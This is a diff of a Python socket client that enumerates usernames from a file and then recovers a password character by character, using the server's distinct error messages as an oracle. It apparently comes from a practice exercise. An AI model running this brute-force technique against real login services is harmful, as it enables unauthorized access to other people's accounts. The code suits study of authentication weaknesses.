@@ -1,33 +1,57 @@
 import socket
 import sys
-import itertools
 import os
+import string
+import json
 
 
-def password_generator():
+def login_generator():
     with open(file_path) as file:
-        passwords = file.read().splitlines()
+        login = file.read().splitlines()
     while True:
-        for pas in passwords:
-            for var in itertools.product(*([char.lower(), char.upper()] for char in pas)):
-                yield var
+        for log in login:
+            yield log
 
 
 def main():
     ip_address, port = sys.argv[1:]
     with socket.socket() as conn:
         conn.connect((ip_address, int(port)))
-        massage = password_generator()
+        log = login_generator()
+        characters = string.ascii_letters + string.digits
         while True:
-            password = next(massage)
-            conn.send(''.join(password).encode())
+            login = next(log)
+            password = ' '
+            message = json.dumps({
+                "login": login,
+                "password": password
+            }).encode()
+            conn.send(message)
             response = conn.recv(1024)
-            if response.decode() == 'Wrong password!':
-                continue
-            print(''.join(password))
-            break
+            if json.loads(response.decode())['result'] == "Wrong password!":
+                break
+        password = ''
+        while True:
+            char_iter = iter(characters)
+            for char in char_iter:
+                my_login = login
+                message = json.dumps({
+                    "login": my_login,
+                    "password": password + char
+                })
+                conn.send(message.encode())
+                response = conn.recv(1024)
+                if json.loads(response.decode())['result'] == "Exception happened during login":
+                    password += char
+                    break
+                elif json.loads(response.decode())['result'] == "Connection success!":
+                    password += char
+                    print(message)
+                    exit()
+                else:
+                    continue
 
 
 if __name__ == "__main__":
-    file_path = os.path.join(os.path.dirname(__file__), "passwords.txt")
+    file_path = os.path.join(os.path.dirname(__file__), "logins.txt")
     main()
